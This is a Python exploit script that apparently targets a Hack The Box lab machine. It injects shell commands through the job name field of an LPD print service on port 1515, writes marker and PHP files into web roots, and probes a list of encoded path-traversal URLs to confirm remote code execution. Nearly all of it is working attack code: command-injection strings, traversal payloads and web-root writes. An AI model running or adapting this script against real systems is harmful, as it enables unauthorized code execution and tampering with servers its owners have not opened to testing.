#!/usr/bin/env python3
import socket, time, urllib.request, urllib.error, os

TARGET = '10.129.38.158'
MARKER = 'RCE_' + os.urandom(4).hex()

def lpd(jn, timeout=6):
    s = socket.socket()
    s.settimeout(timeout)
    try:
        s.connect((TARGET, 1515))
        s.send(b'\x02archive_intake')
        time.sleep(0.2)
        s.recv(1024)
        ct = (f'J{jn}\n').encode()
        s.send(b'\x01' + str(len(ct)).encode() + b'\n' + ct)
        time.sleep(0.4)
        s.recv(4096)
        time.sleep(0.2)
        s.recv(4096)
    except:
        pass
    s.close()

def check(path):
    req = urllib.request.Request(f'http://{TARGET}{path}',
        headers={'Host': 'paperwork.htb'})
    try:
        resp = urllib.request.urlopen(req, timeout=4)
        body = resp.read().decode(errors='replace')
        if MARKER in body:
            return ('RCE_CONFIRMED', body[:100])
        if resp.status != 404:
            return (f'HTTP {resp.status}', body[:60])
    except urllib.error.HTTPError as e:
        if e.code not in (404, 400):
            return (f'HTTP {e.code}', '')
    except:
        return ('TIMEOUT', '')
    return None

print(f'[1] Injecting marker: {MARKER}', flush=True)

# Write marker to multiple locations
j1 = "';echo " + MARKER + " > /tmp/m;'"
j2 = "';echo " + MARKER + " > /var/www/html/m 2>/dev/null;echo " + MARKER + " > /usr/share/nginx/html/m 2>/dev/null;echo " + MARKER + " > /var/www/paperwork.htb/m 2>/dev/null;echo " + MARKER + " > /srv/http/m 2>/dev/null;echo " + MARKER + " > /opt/m 2>/dev/null;'"
j3 = "';mkdir -p /var/www/html/download 2>/dev/null; echo " + MARKER + " > /var/www/html/download/m;'"
lpd(j1)
lpd(j2)
lpd(j3)
time.sleep(3)

print('[2] Probing paths...', flush=True)
paths = [
    '/m',
    '/download/m',
    '/download/../m',
    '/download/%2e%2e/m',
    '/download/..%2fm',
    '/download/%252e%252e%252fm',
    '/tmp/m',
    '/download/../../../tmp/m',
    '/download/..%252f..%252f..%252ftmp/m',
    '/download/%2e%2e/%2e%2e/%2e%2e/tmp/m',
    '/download/..%c0%ae..%c0%ae..%c0%ae/tmp/m',
    '/download/....//....//....//tmp/m',
    '/var/www/html/m',
    '/usr/share/nginx/html/m',
    '/paperwork.htb/m',
    '/opt/m',
]
for p in paths:
    r = check(p)
    if r:
        print(f'  {p}: {r[0]} {r[1]}', flush=True)

print('[3] Testing web root write...', flush=True)
lpd("';echo '<?php phpinfo();?>' > /var/www/html/x.php 2>/dev/null;'")
lpd("';echo '<?php phpinfo();?>' > /usr/share/nginx/html/x.php 2>/dev/null;'")
lpd("';echo '<?php phpinfo();?>' > /var/www/paperwork.htb/x.php 2>/dev/null;'")
time.sleep(2)
for p in ['/x.php', '/x', '/download/x.php']:
    r = check(p)
    if r:
        print(f'  {p}: {r[0]} {r[1]}', flush=True)

print('DONE', flush=True)
